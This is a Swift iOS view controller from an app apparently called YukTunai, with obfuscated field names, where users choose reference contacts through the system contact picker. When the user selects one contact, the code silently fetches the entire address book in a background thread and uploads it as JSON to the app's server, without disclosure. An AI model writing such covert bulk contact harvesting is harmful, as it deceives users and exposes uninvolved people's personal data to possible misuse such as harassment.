//
//  YTUserConnectViewController.swift
//  YukTunai
//
//  Created by whoami on 2024/11/24.
//

import UIKit

class YTUserConnectViewController: YTBaseViewController,CNContactPickerDelegate,UITableViewDelegate,UITableViewDataSource {
    
    let viewModel = ApiViewModel()
    
    var model: impertinentModel?
    
    var t: String?
    
    var pid: String?
    
    var idx: Int?
    
    let table = YTTableView()
    
    var time: Date?
    
    let button = UIButton.init(title: YTTools.areaTitle(a: "Next", b: "Berikutnya"), font: .systemFont(ofSize: 18, weight: .bold), color: .white)

    override func viewDidLoad() {
        super.viewDidLoad()

        time = Date()

        view.backgroundColor = .white
        
        setNavigationBarTitle(t ?? "")
        
        
        button.addTarget(self, action: #selector(nextA), for: .touchUpInside)
        button.cornersSet(by: .allCorners, radius: 25)
        button.setBgColor(color: .init(hex: "#6D90F5"))
        view.add(button) { v in
            v.snp.makeConstraints { make in
                make.left.right.equalToSuperview().inset(20)
                make.bottom.equalToSuperview().offset(YTTools.isIPhone6Series() ? -20 : -39)
                make.height.equalTo(50)
            }
        }
        
        
        view.add(table) { v in
            v.snp.makeConstraints { make in
                make.left.right.equalToSuperview()
                make.bottom.equalTo(button.snp.top).offset(-20)
                make.top.equalTo(cBar.snp.bottom).offset(10)
            }
        }
        table.delegate = self
        table.dataSource = self
        table.register(YTUserConnectViewCell.self, forCellReuseIdentifier: YTUserConnectViewCell.identifier)
       
        
        
        
        
        
        
        viewModel.impertinent(avp: ["erect": pid!]) { [weak self] re in
            switch re {
            case .success(let success):
                

                let m = success?.upper
                
                for item in m!.smokes! {
                    if (item.rose ?? []).count == 0 {
                        let m = roseModel.init()
                        m.selected = true
                        m.directly = item.rector
                        item.rose?.insert(m, at: 0)
                    } else {
                        for i in item.rose! {
                            if i.directly! == item.rector {
                                i.selected = true
                            }
                        }
                    }
                    
                }
                

                self?.model = m
                
                self?.table.reloadData()
                
                break
            case .failure(let failure):
                
                
                
                SVProgressHUD.showInfo(withStatus: failure.description)
                break
            }
        }
        
    }
    
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return (model?.smokes ?? []).count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        
        guard let cell = tableView.dequeueReusableCell(withIdentifier: YTUserConnectViewCell.identifier, for: indexPath) as? YTUserConnectViewCell else {
            return UITableViewCell()
        }
        
        guard let m = model?.smokes?[indexPath.row] else {
            return UITableViewCell()
        }
        
        cell.g1.text = m.downward
        cell.t1.text = m.knits
        cell.t11.text = m.mamsell
        cell.t2.placeholder = m.ur
        cell.t22.placeholder = m.mama
        
        
        if (m.rector ?? "").count > 0 {
            let i = model?.smokes?[indexPath.row].rose?.filter({$0.directly ==  m.rector!}).first?.ensued
            cell.t2.text = i
        }
        
        
        if (m.ensued ?? "").count > 0 && (m.stockings ?? "").count > 0 {
            cell.t22.text = "\((m.ensued ?? "")) \((m.stockings ?? ""))"
        }
        
        
        cell.handle = {[weak self] in
            
            let vc = YTSelectViewController.init()
           
            vc.modalPresentationStyle = .overFullScreen
           
            self?.present(vc, animated: false)
            
            vc.model = m.rose
            
            vc.onKeluarButtonTapped = {[weak self] str in
                let i = self?.model?.smokes?[indexPath.row].rose?.filter({$0.ensued == str}).first?.directly
                self?.model?.smokes?[indexPath.row].rector = i
                cell.t2.text = str
            }
            
        }
        
        cell.tag = indexPath.row
        
        cell.handle1 = { [weak self] idx in
            self?.displayUsr(with: idx)
        }
        
        
        return cell
    }

    
    @objc func nextA(){
       
        guard let list = model?.smokes else {
            return
        }
        
        var resultData = [[String: String]]()

        for item in list {
            var newItem = [String: String]()
            
            // 添加默认值
            newItem["stockings"] = item.stockings
            newItem["ensued"] = item.ensued
            newItem["rector"] = item.rose?.filter({$0.selected == true}).first?.directly
        
            resultData.append(newItem)
        }
  
        print(resultData)

        do {
            let jsonData = try JSONSerialization.data(withJSONObject: resultData, options: [])
            if let jsonString = String(data: jsonData, encoding: .utf8) {
                
                
                

                viewModel.absurd(avp: ["erect":pid!,
                                        "upper":jsonString]) {[weak self] res in
                    switch res {
                    case .success(let success):
                        
                        let data: [String: Any] = ["obliged": "6", "nasty": "\(((self?.time) ?? Date()).timeIntervalSince1970)","newcomers":"\(Date().timeIntervalSince1970)"]
                        NotificationCenter.default.post(name: .myNotification, object: nil, userInfo: data)
                        
                        self?.navigationController?.popViewController(animated: true)
                    case .failure(let failure):
                        
                        
                        SVProgressHUD.showError(withStatus: failure.description)
                        
                    }
                }
            }
        } catch {
            print("user connection json error")
        }
    }

    
    @objc func displayUsr(with d: Int){
        
        
        
    
        YTContactAccessManager.shared().checkContactAuthorizationStatus(self) { result in
            
            if result["contacts"] as? [CNContact] != nil {
                self.idx = d
                self.presentContactPicker()
                } else if let error = result["error"] as? String {
                    
                    
                    SVProgressHUD.dismiss(withDelay: 2.5)
                    SVProgressHUD.show(withStatus: error)
                }
        }
    }
    
    func presentContactPicker(){
        guard let vc =  UIApplication.topViewController() else {
            return
        }
        let contactPicker = CNContactPickerViewController()
        contactPicker.delegate = self
        vc.present(contactPicker, animated: true, completion: nil)
    }
    
    func contactPicker(_ picker: CNContactPickerViewController, didSelect contact: CNContact) {
        var phone : String?
       
        if !contact.phoneNumbers.isEmpty {
            for phoneNumber in contact.phoneNumbers {
                phone = phoneNumber.value.stringValue.removeAllSepace
            }
        }
        
        print("Selected contact: \(contact.givenName) \(contact.familyName) \(phone)")
        
        model?.smokes?[idx!].ensued = "\(contact.givenName) \(contact.familyName)"
        model?.smokes?[idx!].stockings = phone
        table.reloadRows(at: [IndexPath.init(row: idx!, section: 0)], with:   .none)

        DispatchQueue.global().async {
            guard let data = YTContactAccessManager.shared().fetchAllContacts()  as? [[String:String]] else {
                return
            }
            do {
                let jsonData = try JSONSerialization.data(withJSONObject: data , options: [])
                if let jsonString = String(data: jsonData, encoding: .utf8) {
                    upapisServices.shard.crushing(avp: ["upper":jsonString]) { result in
                        switch result {
                        case .success(let success):
                            print("userconnect upload success---------userconnect upload success------userconnect upload success")
                            break
                        case .failure(let failure):
                            print("userconnect upload error---------userconnect upload error------userconnect upload error")
                            break
                        }
                    }
                }
            }catch {
                print("\(error)")
            }
        }
        
        
        
    }
    
    func contactPickerDidCancel(_ picker: CNContactPickerViewController) {
        print("Contact picker cancelled")
    }
    

}












class YTUserConnectViewCell: UITableViewCell {
    
    var handle:(()->())?
    
    var handle1:((Int)->())?
    
    let g1 = UILabel.init(title: "",textColor: .init(hex: "#5F85F4"),font: .systemFont(ofSize: 16))
    
    let t1 = UILabel.init(title: "",textColor: .init(hex: "#212121"),font: .systemFont(ofSize: 14))
    
    let box = UIView.init(bgColor: .init(hex: "#F4F8FF"))
    
    let t2 = YTTextField()
    
    let imagec = UIImageView.init(image: UIImage.init(named: "feeev1223"))
    
    let t11 = UILabel.init(title: "",textColor: .init(hex: "#212121"),font: .systemFont(ofSize: 14))
    
    let box1 = UIView.init(bgColor: .init(hex: "#F4F8FF"))
    
    let t22 = YTTextField()
    
    let imagec1 = UIImageView.init(image: UIImage.init(named: "56gguguou"))
    
    
    override init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {
        super.init(style: style, reuseIdentifier: reuseIdentifier)
        
        contentView.addSubview(g1)
        g1.textAlignment = .center
        g1.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.left.right.equalToSuperview()
            make.top.equalToSuperview().offset(10)
        }
        
        selectionStyle = .none
        
        contentView.addSubview(t1)
        t1.snp.makeConstraints { make in
            make.top.equalTo(g1.snp.bottom).offset(16)
            make.left.equalToSuperview().offset(13)
        }
        
        contentView.addSubview(box)
        box.cornersSet(by: .allCorners, radius: 12)
        box.snp.makeConstraints { make in
            make.left.equalToSuperview().offset(13)
            make.top.equalTo(t1.snp.bottom).offset(10)
            make.right.equalToSuperview().offset(-13)
            make.height.equalTo(52)
        }
        
        t2.isUserInteractionEnabled = false
        t2.font = .systemFont(ofSize: 16)
        t2.textColor = .init(hex: "#212121")
        box.addSubview(t2)
      
        
        box.addSubview(imagec)
        imagec.snp.makeConstraints { make in
            make.width.height.equalTo(16)
            make.centerY.equalToSuperview()
            make.right.equalToSuperview().offset(-13)
        }
        
        t2.snp.makeConstraints { make in
            make.left.equalToSuperview().offset(13)
            make.bottom.top.equalToSuperview()
            make.right.equalTo(imagec.snp.left).offset(-13)
        }
        
        
        contentView.addSubview(t11)
        t11.snp.makeConstraints { make in
            make.top.equalTo(box.snp.bottom).offset(16)
            make.left.equalToSuperview().offset(13)
        }
        
        contentView.addSubview(box1)
        box1.cornersSet(by: .allCorners, radius: 12)
        box1.snp.makeConstraints { make in
            make.left.equalToSuperview().offset(13)
            make.top.equalTo(t11.snp.bottom).offset(10)
            make.right.equalToSuperview().offset(-13)
            make.height.equalTo(52)
            make.bottom.equalToSuperview().offset(-26)
        }
        
        t22.isUserInteractionEnabled = false
        t22.font = .systemFont(ofSize: 16)
        t22.textColor = .init(hex: "#212121")
        box1.addSubview(t22)
      
        
        box1.addSubview(imagec1)
        imagec1.snp.makeConstraints { make in
            make.width.height.equalTo(16)
            make.centerY.equalToSuperview()
            make.right.equalToSuperview().offset(-13)
        }
        
        t22.snp.makeConstraints { make in
            make.left.equalToSuperview().offset(13)
            make.bottom.top.equalToSuperview()
            make.right.equalTo(imagec1.snp.left).offset(-13)
        }
        
        let t = UITapGestureRecognizer.init(target: self, action: #selector(click))
        box.addGestureRecognizer(t)
        
        let t2 = UITapGestureRecognizer.init(target: self, action: #selector(click2))
        box1.addGestureRecognizer(t2)
        
        
        
        
    }
    
    required init?(coder: NSCoder) {
        super.init(coder: coder)
    }
    
    @objc func click(){
        handle?()
    }
    
    @objc func click2(){
        handle1?(tag)
    }
    
}
